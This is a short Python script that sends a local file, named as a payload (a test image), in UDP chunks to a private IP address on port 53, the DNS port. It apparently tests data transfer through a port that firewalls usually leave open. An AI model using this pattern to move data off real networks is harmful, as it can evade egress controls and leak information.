import socket
import logging
import os

# Configure logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

CHUNK_SIZE = 1024  # Size of each chunk to send

def send_message(file_path, server_ip, server_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Read the file in binary mode
        with open(file_path, 'rb') as file:
            chunk = file.read(CHUNK_SIZE)
            while chunk:
                sock.sendto(chunk, (server_ip, server_port))
                logging.info(f"Chunk sent: {chunk[:10]}... ({len(chunk)} bytes)")
                
                # Wait for acknowledgment
                ack, _ = sock.recvfrom(1024)
                logging.debug(f"Received acknowledgment: {ack}")
                
                # Read the next chunk
                chunk = file.read(CHUNK_SIZE)
        logging.info("File sent successfully")
    except Exception as e:
        logging.error(f"Error sending file: {e}")
    finally:
        sock.close()

if __name__ == "__main__":
    server_ip = "172.16.223.86"
    server_port = 53
    payload_file_path = "payload/test_image.jpg"
    
    # Ensure the file path is correct
    if not os.path.exists(payload_file_path):
        logging.error(f"Payload file not found: {payload_file_path}")
    else:
        send_message(payload_file_path, server_ip, server_port)
